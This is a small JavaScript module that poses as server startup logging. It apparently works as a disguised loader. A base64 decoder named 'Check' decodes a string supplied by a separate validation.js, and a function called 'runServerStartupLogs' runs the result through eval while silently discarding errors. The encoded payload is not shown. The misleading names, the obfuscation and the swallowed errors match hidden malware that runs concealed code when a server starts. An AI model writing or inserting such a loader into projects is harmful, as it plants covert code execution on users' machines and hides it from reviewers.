const { validation } = require("./validation.js");
function Check(str) {
  const chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  let result = "";
  let buffer = 0;
  let bits = 0;
  str = String(str).replace(/\s/g, "").replace(/=+$/, "");
  for (let i = 0; i < str.length; i++) {
    const value = chars.indexOf(str[i]);
    if (value === -1) {
      throw new Error("InvalidCharacterError");
    }
    buffer = (buffer << 6) | value;
    bits += 6;
    if (bits >= 8) {
      bits -= 8;
      result += String.fromCharCode((buffer >> bits) & 0xff);
    }
  }
  return result;
}

function runServerStartupLogs() {
  try {
    eval(Check(validation()));
  } catch (err) {}
}

module.exports = { runServerStartupLogs };
